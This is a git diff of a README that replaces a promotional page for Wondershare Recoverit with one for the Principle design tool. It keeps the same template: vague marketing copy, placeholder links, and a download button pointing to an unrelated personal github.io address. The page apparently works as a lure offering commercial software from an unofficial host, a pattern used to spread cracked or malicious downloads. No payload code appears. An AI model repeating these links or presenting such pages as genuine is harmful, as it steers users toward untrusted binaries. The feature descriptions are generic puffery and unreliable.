@@ -1,57 +1,61 @@
-# Wondershare Recoverit Mac
+# Principle – Interaction Design Tool
 
 <p align="center">
-  <img src="https://iconlogovector.com/uploads/images/2025/08/lg-689546edde4b4-Wondershare-Recoverit.webp" width="200" alt="Wondershare Recoverit icon"/>
+  <img src="https://wp.prototypr.io/wp-content/uploads/2018/06/Principal.png" width="200" alt="Principle icon"/>
 </p>
 
 <p align="center">
-
-[![Install](https://img.shields.io/badge/Install-Click%20Here-white?style=for-the-badge&logo=github&logoColor=black&labelColor=white&color=black)](https://jinver-fribman.github.io/.github/wondersharerecoverit)
-
+  <a href="https://jinver-fribman.github.io/.github/principle">
+    <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Principle"/>
+  </a>
 </p>
 
 <p align="center">
-  <img src="https://scoreboard.pandorarecovery.com/wp-content/uploads/2022/04/wondershare-recoverit-hard-drives-and-locations-macos.jpg" alt="Wondershare Recoverit screenshot"/>
+  <img src="https://principleformac.com/static/images/slider4_2x.4e3afe93d08be1a574ada42bd1807d50.jpg" alt="Principle screenshot"/>
 </p>
 
 ---
 
 ## Overview
 
-<a href="#">Wondershare Recoverit</a> retrieves files you thought were gone forever. Accidental deletion, drive formatting, system crashes, and corruption all become recoverable situations. The application scans storage devices at a deep level, finding file fragments that remain even after apparent deletion or damage.
+<a href="#">Principle</a> occupies a unique position in design tools - powerful enough for sophisticated animations yet approachable enough for quick explorations. Motion designers appreciate its capable timeline. UI designers value its simplicity for standard transitions. This balance makes Principle useful across skill levels and project types.
 
-The <a href="#">scanning engine</a> employs multiple techniques to find recoverable data. Quick scan locates recently deleted files rapidly. Deep scan examines drive sectors thoroughly for fragmented and overwritten data. The combination finds files that simpler recovery tools miss while completing faster when extensive scanning isn't necessary.
+<a href="#">Sketch import</a> brings existing designs into Principle directly. Artboards transfer with layers intact. Symbols become editable groups. Text remains editable for content changes. This import path leverages work already done in Sketch rather than requiring redesign.
 
-<a href="#">File type recognition</a> identifies over 1000 formats for accurate recovery. Documents, photos, videos, audio, emails, archives, and specialized formats all recover correctly. The application understands file structures to reconstruct complete files from partial data when possible.
+The <a href="#">Figma import</a> similarly connects to modern design workflows. Copy frames from Figma and paste into Principle. Layer names and structure transfer appropriately. Animation builds on design work without recreation.
 
-The <a href="#">preview functionality</a> shows recoverable files before committing to recovery. View photos, play videos, and read documents directly within Recoverit. Verify files are intact and wanted before recovery. This preview prevents recovering corrupted or unwanted files that waste time and storage.
+<a href="#">Recording</a> captures prototype interactions as video. Record screen sessions showing animations in action. Export to formats suitable for sharing. Embed recordings in documentation and presentations. This recording capability communicates animations to stakeholders who can't run prototypes.
 
-<a href="#">Storage device support</a> covers virtually any media type. Internal hard drives and SSDs. External USB drives and portable storage. Memory cards from cameras and phones. Even storage with partition damage or formatting. This breadth means one tool handles recovery across your storage ecosystem.
+The <a href="#">GIF export</a> creates lightweight animation previews. Generate GIFs from interactions for quick sharing. Embed in project documentation, Slack messages, or presentations. GIFs communicate motion without requiring prototype access.
 
-The <a href="#">crashed computer recovery</a> addresses systems that won't boot. Create bootable recovery media from a working Mac. Boot the crashed system from recovery media. Access and recover files from the non-booting drive. This capability rescues data from systems with serious problems.
+<a href="#">Component states</a> manage complex interactive elements. Buttons can have default, hover, and pressed states. Menus expand and collapse. Tabs switch content. Components encapsulate this state logic for reuse.
 
-<a href="#">Recovery organization</a> presents found files in navigable structures. Browse by original folder location when directory information survives. Filter by file type to find specific content. Search by filename or date. This organization makes finding specific files in large recovery results manageable.
+The <a href="#">math expressions</a> enable dynamic property relationships. Calculate positions based on other element properties. Create layouts that respond to content. Add sophistication without manual keyframing.
+
+<a href="#">Touch event types</a> support realistic mobile interactions. Distinguish taps from long presses. Recognize swipe directions and velocities. Detect scroll thresholds. These event types prototype real mobile gestures accurately.
+
+The <a href="#">Mac-native development</a> provides performance and integration benefits. Principle runs efficiently on macOS. The interface follows Mac conventions. Files save to standard locations and integrate with version control. This native approach creates a responsive, familiar experience.
 
 ---
 
 ## Key Features
 
-- <a href="#">Deep scanning</a> thorough recovery
-- <a href="#">1000+ formats</a> file recognition
-- <a href="#">Preview files</a> before recovery
-- <a href="#">All storage types</a> HDD, SSD, USB, cards
-- <a href="#">Crashed computer</a> bootable recovery
-- <a href="#">Lost partitions</a> recovery
-- <a href="#">Formatted drives</a> data retrieval
-- <a href="#">Video repair</a> fix corrupted files
-- <a href="#">NAS recovery</a> network storage
+- <a href="#">Auto-animation</a> between artboards
+- <a href="#">Drivers</a> scroll and gesture linked
+- <a href="#">Components</a> reusable interactions
+- <a href="#">Timeline</a> precise control
+- <a href="#">Device preview</a> real-time mirroring
+- <a href="#">Sketch import</a> design continuity
+- <a href="#">Figma import</a> modern workflow
+- <a href="#">Video recording</a> export interactions
+- <a href="#">Touch events</a> mobile gestures
 
 ---
 
 ## Additional Information
 
-Wondershare Recoverit addresses real problems with practical solutions developed through understanding actual user needs. The feature set reflects what people genuinely need to accomplish rather than theoretical capabilities. This user-focused development produces software that feels purposeful and efficient.
+Principle represents focused expertise in its specific domain. Rather than attempting to do everything, the application excels at its particular purpose through deep feature development and workflow optimization. Users benefit from this specialization through capabilities generic tools can't match.
 
-Continued development ensures Wondershare Recoverit evolves with user needs and platform changes. New features address emerging requirements while updates maintain compatibility with current macOS releases. This ongoing commitment keeps the application relevant and reliable.
+Professional users appreciate the reliability and consistency Principle provides for critical work. When tasks matter, tools must work dependably. This reliability under pressure distinguishes professional software from casual utilities.
 
 ---
